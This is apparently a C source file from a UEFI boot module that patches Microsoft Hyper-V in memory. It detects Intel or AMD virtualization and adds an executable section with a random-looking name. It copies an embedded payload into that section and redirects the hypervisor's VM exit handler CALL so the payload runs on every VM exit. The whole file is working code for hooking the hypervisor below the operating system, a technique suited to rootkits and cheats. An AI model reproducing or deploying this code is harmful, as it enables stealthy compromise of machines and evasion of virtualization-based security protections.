#include "ExtendedHv.h"
#include "Compiler.h"
#include "WinDefines.h"
#include "../Payload/payload_data.h"

#define HV_ARCH_UNKNOWN 0
#define HV_ARCH_INTEL 1
#define HV_ARCH_AMD 2

// Imports
extern VOID EFIAPI SerialPrint(IN CONST CHAR8 *format, ...);
extern VOID EFIAPI SerialPrintHex(IN CONST CHAR8 *label, IN UINT64 value);
extern UINT64 PeAddSection(IN UINT64 imageBase, IN CONST CHAR8* sectionName, IN UINT32 virtualSize, IN UINT32 characteristics);
extern UINT64 FindPatternImage(IN VOID* imageBase, IN CONST CHAR8* pattern);
extern UINT64 FindPattern(IN VOID* base, IN UINTN size, IN CONST CHAR8* pattern);

// Public Functions
EFI_STATUS InstallPatch_VmExitHandler(UINT64 imageBase, UINT64 imageSize);
UINT64 PatchSizeVmExitHandler(VOID);

// Private Functions
static int DetectHyperVArchitecture(IN VOID* imageBase);
static EFI_STATUS PatchVmExitHandler_Intel(IN UINT64 imageBase, IN UINT64 section);
static EFI_STATUS PatchVmExitHandler_Amd(IN UINT64 imageBase, IN UINT64 section);
static VOID ApplyPatch(IN UINT64 callAddr, IN UINT64 section, IN INT32 arch);

// Implementation
UINT64 PatchSizeVmExitHandler(VOID) {
  return PAYLOAD_SIZE;
}

static int DetectHyperVArchitecture(IN VOID* imageBase) {
  // Intel: Look for VMRESUME
  if (FindPatternImage(imageBase, "0F 01 C3") != 0) {
    SerialPrint("[+] Detected Intel VT-x (found VMRESUME)\n");
    return HV_ARCH_INTEL;
  }
  
  // AMD: Look for VMRUN
  if (FindPatternImage(imageBase, "0F 01 D8") != 0) {
    SerialPrint("[+] Detected AMD-V (found VMRUN)\n");
    return HV_ARCH_AMD;
  }
  
  SerialPrint("[!] Could not detect hypervisor architecture\n");
  return HV_ARCH_UNKNOWN;
}

static VOID ApplyPatch(IN UINT64 callAddr, IN UINT64 section, IN INT32 arch) {
  const UINT64 callBase = callAddr + 5;
  const INT32 originalOffset = *(INT32*)(callAddr + 1);
  const UINT64 originalFunction = callBase + originalOffset;
  const UINT64 hookedFunction = section + PAYLOAD_FUNCTION_OFFSET;
  const INT32 newOffset = (INT32)(hookedFunction - callBase);
  const INT64 offsetToOriginal = (INT64)(originalFunction - hookedFunction);
  
  SerialPrint("\n[*] Applying patch:\n");
  SerialPrintHex("  CALL instruction", callAddr);
  SerialPrintHex("  Original handler", originalFunction);
  SerialPrintHex("  Hooked handler", hookedFunction);
  SerialPrint("  Original offset: 0x%08x\n", originalOffset);
  SerialPrint("  New offset: 0x%08x\n", newOffset);
  SerialPrint("  Relative offset to original: %lld\n", offsetToOriginal);
  
  // Patch payload globals
  INT64 *globalOffset = PAYLOAD_GLOBAL_PTR((VOID*)section);
  *globalOffset = offsetToOriginal;
  
  INT32 *archOffset = PAYLOAD_ARCH_PTR((VOID*)section);
  *archOffset = arch;
  
  SerialPrint("  [+] Updated payload globals\n");
  
  // Patch the CALL
  DisableMemoryProtection();
  *(INT32*)(callAddr + 1) = newOffset;
  FlushInstructionCache((VOID*)callAddr, 5);
  EnableMemoryProtection();
  
  SerialPrint("  [+] Patched CALL instruction\n");
}

//
// AMD Strategy: Use the proven pattern
// Pattern: E8 ? ? ? ? 48 89 04 24 E9
// This is: CALL rel32; mov [rsp], rax; jmp rel32
//
static EFI_STATUS PatchVmExitHandler_Amd(IN UINT64 imageBase, IN UINT64 section) {
  UINT64 patternAddr;
  
  SerialPrint("\n[*] AMD Strategy: Searching for CALL+MOV+JMP pattern\n");
  SerialPrint("    Pattern: E8 ? ? ? ? 48 89 04 24 E9\n");
  
  patternAddr = FindPatternImage((VOID*)imageBase, "E8 ? ? ? ? 48 89 04 24 E9");
  
  if (!patternAddr) {
    SerialPrint("[!] Pattern not found\n");
    return EFI_UNSUPPORTED;
  }
  
  SerialPrint("[+] Found pattern at 0x%p\n", patternAddr);
  
  // Verify it's actually a CALL instruction
  if (*(UINT8*)patternAddr != 0xE8) {
    SerialPrint("[!] ERROR: Expected E8 (CALL) at pattern location\n");
    return EFI_UNSUPPORTED;
  }
  
  ApplyPatch(patternAddr, section, HV_ARCH_AMD);
  
  SerialPrint("[+] AMD VM exit handler patched successfully\n");
  return EFI_SUCCESS;
}

//
// Intel Strategy: Find VMLAUNCH+VMRESUME pair (unique to main VM loop)
// 
// The main VM loop does this:
//   if (first_time)
//     vmlaunch
//   else
//     vmresume
//
// These instructions are very close together (within 10 bytes).
// This pattern is UNIQUE to the main VM entry point.
// 
// Once we find this pair, we scan backwards to find the CALL to the exit handler.
//
static EFI_STATUS PatchVmExitHandler_Intel(IN UINT64 imageBase, IN UINT64 section) {
  PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
  PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)(imageBase + dosHeader->e_lfanew);
  PIMAGE_SECTION_HEADER sectionHdr = IMAGE_FIRST_SECTION(ntHeaders);
  
  UINT64 vmlaunchAddr = 0;
  UINT64 vmresumeAddr = 0;
  
  SerialPrint("\n[*] Intel Strategy: Finding VMLAUNCH+VMRESUME pair (main VM loop)\n");
  SerialPrint("    VMLAUNCH opcode: 0F 01 C2\n");
  SerialPrint("    VMRESUME opcode: 0F 01 C3\n");
  
  // Scan executable sections looking for VMLAUNCH
  for (UINT16 s = 0; s < ntHeaders->FileHeader.NumberOfSections; s++) {
    if (!(sectionHdr[s].Characteristics & EFI_IMAGE_SCN_MEM_EXECUTE)) {
      continue;
    }
    
    UINT64 sectionBase = imageBase + sectionHdr[s].VirtualAddress;
    UINTN sectionSize = sectionHdr[s].Misc.VirtualSize;
    
    SerialPrint("[*] Scanning section: %.8a\n", sectionHdr[s].Name);
    
    // Find VMLAUNCH instructions
    for (UINT64 addr = sectionBase; addr < sectionBase + sectionSize - 3; addr++) {
      // Check for VMLAUNCH (0F 01 C2)
      if (*(UINT8*)addr != 0x0F) continue;
      if (*(UINT8*)(addr + 1) != 0x01) continue;
      if (*(UINT8*)(addr + 2) != 0xC2) continue;
      
      vmlaunchAddr = addr;
      SerialPrint("  [*] Found VMLAUNCH at 0x%p\n", vmlaunchAddr);
      
      // Look for VMRESUME within the next 20 bytes
      // Pattern is typically: vmlaunch; jmp +X; vmresume
      for (UINT64 scan = vmlaunchAddr + 3; scan < vmlaunchAddr + 20 && scan < sectionBase + sectionSize - 3; scan++) {
        if (*(UINT8*)scan == 0x0F && *(UINT8*)(scan + 1) == 0x01 && *(UINT8*)(scan + 2) == 0xC3) {
          vmresumeAddr = scan;
          SerialPrint("  [+] Found VMRESUME at 0x%p (distance: %lld bytes)\n", 
            vmresumeAddr, vmresumeAddr - vmlaunchAddr);
          
          // Found the pair! Now look backwards for CALL
          goto found_pair;
        }
      }
      
      // Skip past this VMLAUNCH
      addr += 2;
    }
  }
  
  SerialPrint("[!] Could not find VMLAUNCH+VMRESUME pair\n");
  return EFI_UNSUPPORTED;

found_pair:
  SerialPrint("\n[+] Found main VM loop entry point\n");
  SerialPrintHex("  VMLAUNCH", vmlaunchAddr);
  SerialPrintHex("  VMRESUME", vmresumeAddr);
  
  //
  // Now scan backwards from VMLAUNCH looking for CALL instructions
  // The exit handler call is typically 200-600 bytes before VMRESUME
  // We'll search up to 1000 bytes back to be safe
  //
  SerialPrint("\n[*] Scanning backwards for CALL to exit handler...\n");
  SerialPrint("    Search range: up to 1000 bytes before VMLAUNCH\n");
  
  UINT64 searchStart = (vmlaunchAddr > 1000) ? (vmlaunchAddr - 1000) : imageBase;
  UINT64 bestCall = 0;
  INT32 bestDistance = 0;
  INT32 candidateCount = 0;
  
  for (UINT64 scan = vmlaunchAddr - 1; scan >= searchStart; scan--) {
    if (*(UINT8*)scan == 0xE8) {  // CALL rel32
      INT32 distance = (INT32)(vmlaunchAddr - scan);
      SerialPrint("  [*] Found CALL at 0x%p (distance: %d bytes)\n", scan, distance);
      
      candidateCount++;
      
      // We want a CALL that's reasonably far back
      // Based on your disassembly, it should be 200-600 bytes
      // Prefer calls in the 300-500 range (middle of expected range)
      if (distance >= 200 && distance <= 700) {
        SerialPrint("    [+] Distance is in valid range (200-700 bytes)\n");
        
        // Pick the one closest to 400 bytes (sweet spot)
        INT32 idealDistance = 400;
        INT32 currentScore = (distance > idealDistance) ? 
          (distance - idealDistance) : (idealDistance - distance);
        INT32 bestScore = (bestDistance > idealDistance) ? 
          (bestDistance - idealDistance) : (idealDistance - bestDistance);
        
        if (bestCall == 0 || currentScore < bestScore) {
          bestCall = scan;
          bestDistance = distance;
          SerialPrint("    [+] This is now the best candidate\n");
        }
      } else if (distance < 200) {
        SerialPrint("    [-] Too close (< 200 bytes), likely not the handler\n");
      } else {
        SerialPrint("    [-] Too far (> 700 bytes), might be unrelated\n");
      }
    }
  }
  
  SerialPrint("\n[*] Search complete. Found %d CALL instructions\n", candidateCount);
  
  if (!bestCall) {
    SerialPrint("[!] No suitable CALL found\n");
    SerialPrint("[!] All CALLs were outside the 200-700 byte range\n");
    SerialPrint("[!] The VM exit handler might be inlined or structured differently\n");
    return EFI_UNSUPPORTED;
  }
  
  SerialPrint("\n[+] Selected best candidate:\n");
  SerialPrintHex("  CALL instruction", bestCall);
  SerialPrint("  Distance to VMLAUNCH: %d bytes\n", bestDistance);
  
  // Verify it's actually a CALL
  if (*(UINT8*)bestCall != 0xE8) {
    SerialPrint("[!] ERROR: Not a CALL instruction!\n");
    return EFI_UNSUPPORTED;
  }
  
  ApplyPatch(bestCall, section, HV_ARCH_INTEL);
  
  SerialPrint("[+] Intel VM exit handler patched successfully\n");
  return EFI_SUCCESS;
}

//
// Main entry point
//
EFI_STATUS InstallPatch_VmExitHandler(UINT64 imageBase, UINT64 imageSize) {
  UINT64 section;
  int arch;
  EFI_STATUS status;
  
  SerialPrint("\n");
  SerialPrint("================================================\n");
  SerialPrint("  VM Exit Handler Patching\n");
  SerialPrint("================================================\n");
  SerialPrintHex("Image base", imageBase);
  SerialPrintHex("Image size", imageSize);
  
  // Detect architecture
  arch = DetectHyperVArchitecture((VOID*)imageBase);
  if (arch == HV_ARCH_UNKNOWN) {
    SerialPrint("[!] Architecture detection failed\n");
    return EFI_UNSUPPORTED;
  }
  
  // Add payload section
  section = PeAddSection(imageBase, ".zczxyhc", PatchSizeVmExitHandler(), SECTION_RWX);
  if (!section) {
    SerialPrint("[!] Failed to add payload section\n");
    return EFI_UNSUPPORTED;
  }
  
  SerialPrintHex("Payload section", section);
  SerialPrint("[+] Payload size: %u bytes\n", PAYLOAD_SIZE);
  
  // Copy payload
  CopyMem((VOID*)section, g_payload_data, PAYLOAD_SIZE);
  SerialPrint("[+] Payload copied to section\n");
  
  // Apply architecture-specific patch
  if (arch == HV_ARCH_INTEL) {
    status = PatchVmExitHandler_Intel(imageBase, section);
  } else {
    status = PatchVmExitHandler_Amd(imageBase, section);
  }
  
  if (EFI_ERROR(status)) {
    SerialPrint("[!] Patching failed\n");
  } else {
    SerialPrint("\n[+] Patching completed successfully\n");
    SerialPrint("[*] Payload will execute on next VM exit\n");
  }
  
  SerialPrint("================================================\n\n");
  
  return status;
}
